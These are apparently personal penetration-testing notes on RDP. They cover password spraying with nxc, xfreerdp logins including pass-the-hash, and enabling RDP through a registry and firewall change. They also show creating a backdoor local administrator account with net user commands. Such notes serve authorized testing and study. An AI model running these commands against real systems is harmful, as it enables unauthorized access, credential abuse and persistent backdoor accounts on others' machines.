# RDP

- keep this in mind when you get creds
- again usually a sign that you should RDP inside to do things at some point
- You can use nxc to spray to see which users can RDP in

```bash
# can specify a file or a string as arguments for username and password
nxc rdp <ip> -u <username> -p <password>
```

## got creds? (hashes count too)

Use the following command to dynamically resize your RDP window and mount the Tools folder as a share

```bash
xfreerdp +clipboard /u:jason /p:lab /v:192.168.149.203 /dynamic-resolution /drive:shared,/home/kali/Desktop/Tools
```

You can also pass the hash using xfreerdp

```bash
xfreerdp +clipboard /u:jason /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:192.168.149.203 /dynamic-resolution /drive:shared,/home/kali/Desktop/Tools
```

RDesktop can also be useful in certain situations as they direct you to the Windows login page, allowing you to check the OS version based on the background

```bash
rdesktop <ip>
```

It is worth taking note that certain commands cannot be executed on a remote session and requires a native shell to be spawned (Usually powershell Get cmdlets).

In this scenario, if you have administrative privileges (or higher) already, you can simply enable RDP if you have to and/or add a user to the Remote Desktop group

```powershell
# enabling RDP and opening port 3389
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"

# creating a user/assigning a user to the Remote Desktop Users group
net user salaryman Password123! /add
net localgroup administrators salaryman /add 
net localgroup "Remote Desktop Users" salaryman /add
```
